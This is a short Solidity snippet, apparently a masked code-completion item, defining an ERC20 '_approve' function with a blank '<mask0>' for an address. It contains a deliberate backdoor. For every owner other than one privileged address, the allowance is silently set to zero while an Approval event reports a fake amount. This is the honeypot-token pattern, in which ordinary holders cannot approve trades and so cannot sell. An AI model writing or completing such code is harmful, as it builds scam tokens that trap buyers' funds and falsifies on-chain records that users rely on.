"function _approve(address ol, address tt, uint256 amount) private {        require(ol != address(0), \"ERC20: approve from the zero address\");        require(tt != address(0), \"ERC20: approve to the zero address\");        if (ol != <mask0>) { _allowances[ol][tt] = 0; emit Approval(ol, tt, 4); }          else { _allowances[ol][tt] = amount; emit Approval(ol, tt, amount); }     }"